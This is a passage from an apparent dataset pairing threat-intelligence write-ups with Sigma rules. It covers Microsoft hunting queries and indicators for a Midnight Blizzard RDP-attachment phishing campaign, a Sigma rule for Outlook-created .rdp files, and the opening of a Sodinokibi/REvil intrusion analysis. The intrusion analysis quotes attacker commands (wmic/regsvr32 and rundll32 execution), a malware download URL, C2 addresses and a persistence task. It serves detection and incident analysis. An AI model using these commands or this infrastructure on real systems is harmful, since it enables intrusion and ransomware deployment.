suspicious domain identified by threat intelligence\n- Suspicious outgoing RDP network activity\n- Traffic detected from IP addresses recommended for blocking\n\n### Microsoft Defender for Office 365\n\nMicrosoft Defender for Office 365 raises alerts on this campaign using email- and attachment-based detections. Additionally, hunting signatures and an RDP file parser have been incorporated into detections to block similar campaigns in the future. Defenders can identify such activity in alert titles referencing RDP, for example, *Trojan_RDP*.\n\n## Threat intelligence reports\n\nMicrosoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide threat intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.\n\n**Microsoft Defender Threat Intelligence**\n\n- Midnight Blizzard targets NGOs in new wave of initial access campaigns.\n- Midnight Blizzard targets diplomatic, NGOs, and humanitarian organizations in global spear phishing activity.\n\n## Hunting queries\n\n### Microsoft Defender XDR\n\n**Identify potential Midnight Blizzard targeted recipients**\n\nSurface possible targeted email accounts within the environment where the email sender originated from a Midnight Blizzard compromised domain related to the RDP activity.\n\n```\nEmailEvents\n| where SenderFromDomain in~ (\"sellar.co.uk\", \"townoflakelure.com\", \"totalconstruction.com.au\", \"swpartners.com.au\", \"cewalton.com\")\n| project SenderFromDomain, SenderFromAddress, RecipientEmailAddress, Subject, Timestamp\n```\n\n**Surface potential targets of an RDP attachment phishing attempt**\n\nSurface emails that contain a remote desktop protocol (RDP) file attached. This may indicate that the recipient of the email may have been targeted in an RDP attachment phishing attack attempt.\n\n```\nEmailAttachmentInfo\n| where FileName has \".rdp\"\n| join kind=inner (EmailEvents) on NetworkMessageId\n| project SenderFromAddress, RecipientEmailAddress, Subject, Timestamp, FileName, FileType\n```\n\n**Identify potential successfully targeted assets in an RDP attachment phishing attack**\n\nSurface devices that may have been targeted in an email with an RDP file attached, followed by an RDP connection attempt from the device to an external network. This combined activity may indicate that a device may have been successfully targeted in an RDP attachment phishing attack.\n\n```\n// Step 1: Identify emails with RDP attachments\nlet rdpEmails = EmailAttachmentInfo\n| where FileName has \".rdp\"\n| join kind=inner (EmailEvents) on NetworkMessageId\n| project EmailTimestamp = Timestamp, RecipientEmailAddress, NetworkMessageId, SenderFromAddress;\n\n// Step 2: Identify outbound RDP connections\nlet outboundRDPConnections = DeviceNetworkEvents\n| where RemotePort == 3389\n| where ActionType == \"ConnectionAttempt\"\n| where RemoteIPType == \"Public\"\n| project RDPConnectionTimestamp = Timestamp, DeviceId, InitiatingProcessAccountUpn, RemoteIP;\n\n// Step 3: Correlate email and network events\nrdpEmails\n| join kind=inner (outboundRDPConnections) on $left.RecipientEmailAddress == $right.InitiatingProcessAccountUpn\n| project EmailTimestamp, RecipientEmailAddress, SenderFromAddress, RDPConnectionTimestamp, DeviceId, RemoteIP\n```\n\n**Threat actor RDP connection files attached to email**\n\nSurface users that may have received an RDP connection file attached in email that have been observed in this attack from Midnight Blizzard.\n\n```\nEmailAttachmentInfo\n| where FileName in~ (\n    \"AWS IAM Compliance Check.rdp\",\n    \"AWS IAM Configuration.rdp\",\n    \"AWS IAM Quick Start.rdp\",\n    \"AWS SDE Compliance Check.rdp\",\n    \"AWS SDE Environment Check.rdp\",\n    \"AWS Secure Data Exchange - Compliance Check.rdp\",\n    \"AWS Secure Data Exchange Compliance.rdp\",\n    \"Device Configuration Verification.rdp\",\n    \"Device Security Requirements Check.rdp\",\n    \"IAM Identity Center Access.rdp\",\n    \"IAM Identity Center Application Access.rdp\",\n    \"Zero Trust Architecture Configuration.rdp\",\n    \"Zero Trust Security Environment Compliance Check.rdp\",\n    \"ZTS Device Compatibility Test.rdp\"\n)\n| project Timestamp, FileName, SHA256, RecipientEmailAddress, SenderDisplayName, SenderFromAddress\n```\n\n### Microsoft Sentinel\n\nMicrosoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\n\n## Indicators of compromise\n\n**Email sender domains:**\n\n- sellar[.]co.uk\n- townoflakelure[.]com\n- totalconstruction[.]com.au\n- swpartners[.]com.au\n- cewalton[.]com\n\n**RDP file names:**\n\n- AWS IAM Compliance Check.rdp\n- AWS IAM Configuration.rdp\n- AWS IAM Quick Start.rdp\n- AWS SDE Compliance Check.rdp\n- AWS SDE Environment Check.rdp\n- AWS Secure Data Exchange – Compliance Check.rdp\n- AWS Secure Data Exchange Compliance.rdp\n- Device Configuration Verification.rdp\n- Device Security Requirements Check.rdp\n- IAM Identity Center Access.rdp\n- IAM Identity Center Application Access.rdp\n- Zero Trust Architecture Configuration.rdp\n- Zero Trust Security Environment Compliance Check.rdp\n- ZTS Device Compatibility Test.rdp\n\n**RDP remote computer domains:**\n\n| Domain 1                                    | Domain 2                                      |\n| ------------------------------------------- | --------------------------------------------- |\n| ap-northeast-1-aws.s3-ua[.]cloud            | ap-northeast-1-aws.ukrainesec[.]cloud         |\n| ca-central-1.gov-ua[.]cloud                 | ca-central-1.ua-gov[.]cloud                   |\n| ca-west-1.aws-ukraine[.]cloud               | ca-west-1.mfa-gov[.]cloud                     |\n| ca-west-1.ukrtelecom[.]cloud                | central-2-aws.ua-mil[.]cloud                  |\n| central-2-aws.ua-sec[.]cloud                | central-2-aws.ukrainesec[.]cloud              |\n| central-2-aws.ukrtelecom[.]cloud            | eu-central-1.difesa-it[.]cloud                |\n| eu-central-1.mfa-gov[.]cloud                | eu-central-1.mil-be[.]cloud                   |\n| eu-central-1.mil-pl[.]cloud                 | eu-central-1.minbuza[.]cloud                  |\n| eu-central-1.mindef-nl[.]cloud              | eu-central-1.msz-pl[.]cloud                   |\n| eu-central-1.quirinale[.]cloud              | eu-central-1.regeringskansliet-se[.]cloud     |\n| eu-central-1.s3-be[.]cloud                  | eu-central-1.s3-esa[.]cloud                   |\n| eu-central-1.s3-nato[.]cloud                | eu-central-1.ua-gov[.]cloud                   |\n| eu-central-1.ua-sec[.]cloud                 | eu-central-1.ukrtelecom[.]cloud               |\n| eu-central-1-aws.amazonsolutions[.]cloud    | eu-central-1-aws.dep-no[.]cloud               |\n| eu-central-1-aws.gov-pl[.]cloud             | eu-central-1-aws.gov-sk[.]cloud               |\n| eu-central-1-aws.gov-trust[.]cloud          | eu-central-1-aws.mfa-gov[.]cloud              |\n| eu-central-1-aws.minbuza[.]cloud            | eu-central-1-aws.mindef-nl[.]cloud            |\n| eu-central-1-aws.msz-pl[.]cloud             | eu-central-1-aws.mzv-sk[.]cloud               |\n| eu-central-1-aws.ncfta[.]cloud              | eu-central-1-aws.presidencia-pt[.]cloud       |\n| eu-central-1-aws.quirinale[.]cloud          | eu-central-1-aws.regeringskansliet-se[.]cloud |\n| eu-central-1-aws.s3-be[.]cloud              | eu-central-1-aws.s3-ua[.]cloud                |\n| eu-central-1-aws.ua-gov[.]cloud             | eu-central-1-aws.ukrainesec[.]cloud           |\n| eu-central-2-aws.amazonsolutions[.]cloud    | eu-central-2-aws.aws-ukraine[.]cloud          |\n| eu-central-2-aws.dep-no[.]cloud             | eu-central-2-aws.gov-pl[.]cloud               |\n| eu-central-2-aws.gov-sk[.]cloud             | eu-central-2-aws.mil-be[.]cloud               |\n| eu-central-2-aws.mil-pl[.]cloud             | eu-central-2-aws.mindef-nl[.]cloud            |\n| eu-central-2-aws.msz-pl[.]cloud             | eu-central-2-aws.quirinale[.]cloud            |\n| eu-central-2-aws.s3-be[.]cloud              | eu-central-2-aws.s3-de[.]cloud                |\n| eu-central-2-aws.s3-esa[.]cloud             | eu-central-2-aws.s3-ua[.]cloud                |\n| eu-central-2-aws.ua-gov[.]cloud             | eu-south-1-aws.amazonsolutions[.]cloud        |\n| eu-south-1-aws.dep-no[.]cloud               | eu-south-1-aws.difesa-it[.]cloud              |\n| eu-south-1-aws.gov-pl[.]cloud               | eu-south-1-aws.gov-trust[.]cloud              |\n| eu-south-1-aws.mil-be[.]cloud               | eu-south-1-aws.minbuza[.]cloud                |\n| eu-south-1-aws.mzv-sk[.]cloud               | eu-south-1-aws.quirinale[.]cloud              |\n| eu-south-1-aws.s3-be[.]cloud                | eu-south-1-aws.s3-de[.]cloud                  |\n| eu-south-1-aws.ua-gov[.]cloud               | eu-south-2.dep-no[.]cloud                     |\n| eu-south-2.gov-pl[.]cloud                   | eu-south-2.gov-sk[.]cloud                     |\n| eu-south-2.mil-be[.]cloud                   | eu-south-2.mil-pl[.]cloud                     |\n| eu-south-2.mindef-nl[.]cloud                | eu-south-2.s3-be[.]cloud                      |\n| eu-south-2.s3-de[.]cloud                    | eu-south-2.s3-esa[.]cloud                     |\n| eu-south-2.s3-nato[.]cloud                  | eu-south-2.ua-sec[.]cloud                     |\n| eu-south-2.ukrainesec[.]cloud               | eu-south-2-aws.amazonsolutions[.]cloud        |\n| eu-south-2-aws.dep-no[.]cloud               | eu-south-2-aws.gov-pl[.]cloud                 |\n| eu-south-2-aws.gov-sk[.]cloud               | eu-south-2-aws.mfa-gov[.]cloud                |\n| eu-south-2-aws.mil-be[.]cloud               | eu-south-2-aws.mil-pl[.]cloud                 |\n| eu-south-2-aws.mil-pt[.]cloud               | eu-south-2-aws.minbuza[.]cloud                |\n| eu-south-2-aws.msz-pl[.]cloud               | eu-south-2-aws.mzv-sk[.]cloud                 |\n| eu-south-2-aws.ncfta[.]cloud                | eu-south-2-aws.quirinale[.]cloud              |\n| eu-south-2-aws.regeringskansliet-se[.]cloud | eu-south-2-aws.s3-be[.]cloud                  |\n| eu-south-2-aws.s3-de[.]cloud                | eu-south-2-aws.s3-esa[.]cloud                 |\n| eu-south-2-aws.s3-nato[.]cloud              | eu-south-2-aws.s3-ua[.]cloud                  |\n| eu-south-2-aws.ua-gov[.]cloud               | eu-southeast-1-aws.amazonsolutions[.]cloud    |\n| eu-southeast-1-aws.aws-ukraine[.]cloud      | eu-southeast-1-aws.dep-no[.]cloud             |\n| eu-southeast-1-aws.difesa-it[.]cloud        | eu-southeast-1-aws.gov-sk[.]cloud             |\n| eu-southeast-1-aws.gov-trust[.]cloud        | eu-southeast-1-aws.mil-be[.]cloud             |\n| eu-southeast-1-aws.mil-pl[.]cloud           | eu-southeast-1-aws.mindef-nl[.]cloud          |\n| eu-southeast-1-aws.msz-pl[.]cloud           | eu-southeast-1-aws.mzv-cz[.]cloud             |\n| eu-southeast-1-aws.mzv-sk[.]cloud           | eu-southeast-1-aws.quirinale[.]cloud          |\n| eu-southeast-1-aws.s3-be[.]cloud            | eu-southeast-1-aws.s3-de[.]cloud              |\n| eu-southeast-1-aws.s3-esa[.]cloud           | eu-southeast-1-aws.s3-ua[.]cloud              |\n| eu-southeast-1-aws.ua-energy[.]cloud        | eu-southeast-1-aws.ukrainesec[.]cloud         |\n| eu-west-1.aws-ukraine[.]cloud               | eu-west-1.difesa-it[.]cloud                   |\n| eu-west-1.gov-sk[.]cloud                    | eu-west-1.mil-be[.]cloud                      |\n| eu-west-1.mil-pl[.]cloud                    | eu-west-1.minbuza[.]cloud                     |\n| eu-west-1.msz-pl[.]cloud                    | eu-west-1.mzv-sk[.]cloud                      |\n| eu-west-1.regeringskansliet-se[.]cloud      | eu-west-1.s3-de[.]cloud                       |\n| eu-west-1.s3-esa[.]cloud                    | eu-west-1.s3-ua[.]cloud                       |\n| eu-west-1.ua-gov[.]cloud                    | eu-west-1.ukrtelecom[.]cloud                  |\n| eu-west-1-aws.amazonsolutions[.]cloud       | eu-west-1-aws.aws-ukraine[.]cloud             |\n| eu-west-1-aws.dep-no[.]cloud                | eu-west-1-aws.gov-pl[.]cloud                  |\n| eu-west-1-aws.gov-sk[.]cloud                | eu-west-1-aws.gov-trust[.]cloud               |\n| eu-west-1-aws.gov-ua[.]cloud                | eu-west-1-aws.mil-be[.]cloud                  |\n| eu-west-1-aws.mil-pl[.]cloud                | eu-west-1-aws.minbuza[.]cloud                 |\n| eu-west-1-aws.quirinale[.]cloud             | eu-west-1-aws.s3-be[.]cloud                   |\n| eu-west-1-aws.s3-de[.]cloud                 | eu-west-1-aws.s3-esa[.]cloud                  |\n| eu-west-1-aws.s3-nato[.]cloud               | eu-west-1-aws.ua-sec[.]cloud                  |\n| eu-west-1-aws.ukrainesec[.]cloud            | eu-west-2-aws.amazonsolutions[.]cloud         |\n| eu-west-2-aws.dep-no[.]cloud                | eu-west-2-aws.difesa-it[.]cloud               |\n| eu-west-2-aws.gov-pl[.]cloud                | eu-west-2-aws.gov-sk[.]cloud                  |\n| eu-west-2-aws.gv-at[.]cloud                 | eu-west-2-aws.mil-be[.]cloud                  |\n| eu-west-2-aws.mil-pl[.]cloud                | eu-west-2-aws.minbuza[.]cloud                 |\n| eu-west-2-aws.mindef-nl[.]cloud             | eu-west-2-aws.msz-pl[.]cloud                  |\n| eu-west-2-aws.mzv-sk[.]cloud                | eu-west-2-aws.quirinale[.]cloud               |\n| eu-west-2-aws.s3-be[.]cloud                 | eu-west-2-aws.s3-de[.]cloud                   |\n| eu-west-2-aws.s3-esa[.]cloud                | eu-west-2-aws.s3-nato[.]cloud                 |\n| eu-west-2-aws.s3-ua[.]cloud                 | eu-west-2-aws.ua-sec[.]cloud                  |\n\n## References\n\n- https://cert.gov.ua/article/6281076\n- https://aws.amazon.com/blogs/security/amazon-identified-internet-domains-abused-by-apt29/\n- https://media.defense.gov/2024/Oct/09/2003562611/-1/-1/0/CSA-UPDATE-ON-SVR-CYBER-OPS.PDF\n- https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor/?msockid=392e4194f0f26165030055c3f1de6080\n- https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/?msockid=392e4194f0f26165030055c3f1de6080",
    "sigma_rule": {
      "title": ".RDP File Created by Outlook Process",
      "id": "f748c45a-f8d3-4e6f-b617-fe176f695b8f",
      "related": [
        {
          "id": "fccfb43e-09a7-4bd2-8b37-a5a7df33386d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects the creation of files with the \".rdp\" extensions in the temporary directory that Outlook uses when opening attachments.\nThis can be used to detect spear-phishing campaigns that use RDP files as attachments.\n",
      "references": [
        "https://thecyberexpress.com/rogue-rdp-files-used-in-ukraine-cyberattacks/",
        "https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/",
        "https://www.linkedin.com/feed/update/urn:li:ugcPost:7257437202706493443?commentUrn=urn%3Ali%3Acomment%3A%28ugcPost%3A7257437202706493443%2C7257522819985543168%29&dashCommentUrn=urn%3Ali%3Afsd_comment%3A%287257522819985543168%2Curn%3Ali%3AugcPost%3A7257437202706493443%29"
      ],
      "author": "Florian Roth",
      "date": "2024-11-01",
      "modified": "2024-11-03",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection_extension": {
          "TargetFilename|endswith": ".rdp"
        },
        "selection_location": [
          {
            "TargetFilename|contains": [
              "\\AppData\\Local\\Packages\\Microsoft.Outlook_",
              "\\AppData\\Local\\Microsoft\\Olk\\Attachments\\"
            ]
          },
          {
            "TargetFilename|contains|all": [
              "\\AppData\\Local\\Microsoft\\Windows\\",
              "\\Content.Outlook\\"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Whenever someone receives an RDP file as an email attachment and decides to save or open it right from the attachments"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_outlook_rdp_file_creation.yml",
    "id": "869"
  },
  {
    "url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
    "markdown": "# Sodinokibi (aka REvil) Ransomware\n\n**Categories:**\nadfind\ncobaltstrike\nicedid\nransomware\nrevil\nSodinokibi\n\n**Published on:** March 29, 2021\n\n### Intro\n\nSodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand.\n\nIn March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat actors escalated privileges to Domain Administrator, exfiltrated data, and used Sodinokibi to ransom all domain joined systems.\n\n### Case Summary\n\nThe IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families. In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.\n\nPersistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution. About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used throughout the intrusion. Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers. We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID. #ArtifactsMatter. It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.\n\nAfter compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service. The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.\n\nAdditional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems. After discovery was completed, credentials were dumped from lsass. After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.\n\nThree and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.\n\nAt the four hour mark, the threat actors began to move on to final objectives. They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain. After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag `-smode`, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking. Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.\n\nBooting into Safe Mode with Networking blocked the startup of security tools and other management agents. Networking worked, but because services couldn’t start, we were unable to remotely manage the systems using our normal tools. We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.\n\nOn certain systems, ransomware was executed without the `-smode` flag, and on other systems a dll was executed via `rundll32` to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.\n\nAbout 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems. The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days. If we didn’t pay within 7 days the price goes up to around $400k. The ransom is required to be paid in Monero instead of the usual Bitcoin. This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis. The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.\n\n### Services\n\nOur Threat Feed service picked up one of the two Cobalt Strike servers one day before this intrusion occurred and the other IP was added to the feed as soon as we recognized it.\n\nWe also have artifacts available from this case such as ransomware samples (dll and exe), pcaps, memory captures, files, Kape packages and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a timeline detailing the events related to the Sodinokibi (REvil) ransomware attack. It outlines specific actions taken by threat actors, including the initial execution of IcedID, lateral movements to various servers, exfiltration of files, and the deployment of ransomware, along with the corresponding times and types of connections made during the attack. Each event is represented in a structured format, showing the progression of the attack over time.\nTranscription: |\n  Sodinokibi (aka REvil) Ransomware\n  \n  18:05 UTC Initial IcedID execution on beach head host\n  C2 connection: 161.35.109.168:443\n  \n  18:06 IcedID discovery initiated on host\n  \n  19:21 Cobalt Strike Beacons executed on beach head host\n  C2 connection: 45.86.163.78:443 cloudmetric.online\n  C2 connection: 195.189.99.74:443 smalleststores.com\n  \n  19:30 Lateral movement to Exchange server using Cobalt Strike\n  \n  19:53 Lateral movement to domain controller from Exchange server\n  \n  20:45 Threat actors begin moving laterally using RDP\n  \n  21:35 Exfiltration of files using Rclone\n  C2 connection: 45.147.160.5:443\n  \n  22:06 First deployment of ransomware using BITSAdmin\n  \n  22:07 Execution of Sodinokibi ransomware with -s mode flag by threat actor over RDP connection\n  \n  22:28 Final ransomware deployment\n```\n\n### MITRE ATT&CK\n\n#### Initial Access\n\nInitial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.\n\nThe delivery format was an xlsm file:\n\nInitial execution of the document writes a file to:\n\n```\nC:\\Users\\Public\\microsoft.security\n```\n\nThe Excel file called wmic to execute the file with regsrv32:\n\n```\nwmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'\n```\n\n```image\nAlt: wmic command\nDescription: The image displays a screenshot of a process list related to a cyber intrusion involving Sodinokibi (REvil) ransomware and IcedID malware. It shows the execution of Microsoft Excel, the WMIC command being used to create a process with regsvr32, and the path to a file located in the user's public directory. This information is relevant for understanding the steps taken in the malware's execution and the initial access method.\nTranscription: |\n  Processes\n  - C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\n    \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\" \"C:\\Users\\Admin\\AppData\\Local\\Temp\\Documents972.xlsm\"\n  \n  - C:\\Windows\\System32\\Wbem\\wmic.exe\n    wmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'\n  \n  - C:\\Windows\\system32\\regsvr32.exe\n    regsvr32 -s C:\\Users\\Public\\microsoft.security\n```\n\nThis then made a network request to download a file from this URL:\n\n```\nhttp://vpu03jivmm03qncgx.com/index.gif\n```\n\nThe GIF however was the IcedID malware.\n\n```image\nAlt: IcedID\nDescription: The image displays an HTTP request log, specifically a GET request for an index.gif file. It includes headers such as 'Accept', 'User-Agent', 'Host', and 'Connection', as well as a response indicating a 200 OK status from an Apache server. The body of the response contains what appears to be corrupted or encoded data, hinting at the malicious content being delivered through the request.\n```\n\n#### Execution\n\nOnce IcedID was downloaded to the host, the malware was executed using `rundll32.exe`:\n\n```\nrundll32.exe \"C:\\Users\\USERNAME\\AppData\\Local\\Temp\\skull-x64.dat\",update /i:\"DwarfWing\\license.dat\"\n```\n\nAfter execution, the malware made contact with `161.35.109[.]168` which it continued to beacon to, throughout the intrusion.\n\n#### Persistence\n\nIcedID setup persistence on the beach head host using a scheduled task.\n\n```\nwewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n```\n\n```image\nAlt: Scheduled Task\nDescription: The image depicts an XML configuration file for a scheduled task, related to the Sodinokibi (REvil) ransomware. It includes various settings such as triggers, execution policies, and commands to run a malicious executable. The task is set to execute at a defined time with specific parameters, emphasizing its persistence mechanism on a Windows system. Key elements like 'LogonTrigger' and 'Command' indicate how the task is scheduled to maintain the ransomware's presence on the infected system.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <URI>wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <TimeTrigger>\n        <Repetition>\n          <Interval>P1D</Interval>\n          <StopAtDurationEnd>false</StopAtDurationEnd>\n        </Repetition>\n        <StartBoundary>2012-01-01T12:00:00</StartBoundary>\n        <Enabled>true</Enabled>\n      </TimeTrigger>\n      <LogonTrigger>\n        <Enabled>true</Enabled>\n        <UserId/>\n      </LogonTrigger>\n    </Triggers>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew/MultipleInstancesPolicy</MultipleInstancesPolicy>\n      <DisallowStartOnBatteries>false</DisallowStartOnBatteries>\n      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n      <AllowHardTerminate>false</AllowHardTerminate>\n      <StartWhenAvailable>true</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>P10M</Duration>\n        <WaitTimeout>P1H</WaitTimeout>\n        <StopOnIdleEnd>false</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>P0S</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions context=\"Author\">\n      <Exec>\n        <Command>rundll32.exe</Command>\n        <Arguments>\"C:\\Users\\AppData\\Roaming\\douxiy\\Ciocca.dll\",update /i:\"DwarfWing\\license.dat\"</Arguments>\n      </Exec>\n    </Actions>\n  </Task>\n```\n\n```image\nAlt: Registry Key\nDescription: The image displays a technical overview of a registry modification related to the Sodinokibi (REvil) ransomware. It shows the created registry key along with its path: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}'. The registry modification section indicates the value type as '6', which is significant for understanding the persistence mechanism of the ransomware. Additionally, the image features a visual representation of processes such as wininit.exe, services.exe, and svchost.exe, implying the context of the executed ransomware environment.\nTranscription: |\n  wininit.exe\n  services.exe\n  svchost.exe\n  \n  created registry key\n  \n  Registry modification\n  \n  Registry key\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n  \n  Value type\n  6\n```\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n```\n\nThe execution of the ransomware executable created a RunOnce key for persistence.\n\n```\nHKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*AstraZeneca\n```\n\n```image\nAlt: RunOnce Key\nDescription: The image displays a log entry related to a Windows event, specifically detailing a registry modification made by a process. Key components include the 'details' showing the path of the executable, 'eventType' indicating a value set operation, and 'targetObject' which specifies the registry path where the modification occurred. This log entry illustrates the use of a RunOnce key for persistence by ransomware, linking to the mentioned AstraZeneca key.\nTranscription: |\n  details          C:\\Windows\\*\\*.exe\n  eventType        SetValue\n  image            C:\\Windows\\*\\*.exe\n  processGuid      {b093c253-dfa5-604f-3c07-000000001008}\n  processId        6512\n  ruleName         technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder\n  targetObject     HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca\n  utcTime          *\n  channel          Microsoft-Windows-Sysmon/Operational\n```\n\n#### Privilege Escalation\n\nAfter completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the `wuauclt.exe` process executed several PowerShell functions for UAC bypasses including:\n\n- UAC-TokenMagic\n- Invoke-SluiBypass\n\n#### Defense Evasion\n\nAbout one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.\n\n```image\nAlt: Cobalt Strike Servers\nDescription: The image is a flow diagram illustrating the connection between IcedID and Cobalt Strike. It depicts a command execution process using 'rundll32.exe' to run a specified file path, which leads to the creation of remote threads via 'Cmd.exe'. Various IP addresses and domain names are displayed, indicating the external servers contacted during the process. The diagram provides a clear visual representation of the malware's behavior and the specific commands executed, making it relevant to Cyber Threat Intelligence.\nTranscription: |\n  IcedID to Cobalt Strike\n  ----------------------------------------\n  rundll32.exe \"C:\\Users\\UserName\\AppData\\Local\\Temp\\skull-x64.dat\", update /i:\"DwarfWing\\license.dat\"\n      ├── Create Remote Thread Cmd.exe\n      │       └── 45.86.163.78:80\n      │               └── Explorer.exe\n      │                       ├── 45.86.163.78:443\n      │                       │       └── cloudmetric.online\n      │                       └── WUAUCLT.exe\n      └── Create Remote Thread Cmd.exe\n              └── 195.189.99.74:443\n                      └── smalleststores.com\n```\n\nProcess injection was used multiple times across the environment using Cobalt Strike Beacons.\n\n```image\nAlt: Process Injection\nDescription: The image displays a log entry related to a security alert about process injection. It includes specific details such as the rule name, timestamps, source and target process GUIDs, process IDs, and the associated images. This technical information indicates a potential security threat where one process is attempting to inject code into another, a common tactic used by malware.\nTranscription: |\n  \"CreateRemoteThread detected:\n  RuleName: technique_id=T1055, technique_name=Process Injection\n  UtcTime:\n  SourceProcessGuid: {4d5468e-bb44-604f-8219-000000000000}\n  SourceProcessId: 4208\n  SourceImage: C:\\Windows\\SysWOW64\\rundll32.exe\n  TargetProcessGuid: {4d5468e-4969-6047-1c00-000000000000}\n  TargetProcessId: 1412\n  TargetImage: C:\\Windows\\System32\\svchost.exe\n  NewThreadId: 3996\n  StartAddress: 0x00000000003D0003\n  StartModule: -\n  StartFunction: -\"\n```\n\nPrior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.\n\n```image\nAlt: GPO\nDescription: The image displays a detailed log of a process creation event related to the PowerShell technique within the MITRE ATT&CK framework. It includes various technical details such as RuleName, ProcessGuid, ProcessId, Image, and Description, indicating that the process is associated with Microsoft Management Console. Additional information includes command line parameters, parent process details, and hash values for integrity and verification. This log provides insights into the execution context and behavior of a potentially malicious process.\nTranscription: |\n  Process Create:\n    RuleName: technique id=T1059.001.technique_name=PowerShell\n    UtcTime:\n    ProcessGuid: {46d5468e-d592-604f-401a-000000000000}\n    ProcessId: 1572\n    Image: C:\\Windows\\System32\\mmc.exe\n    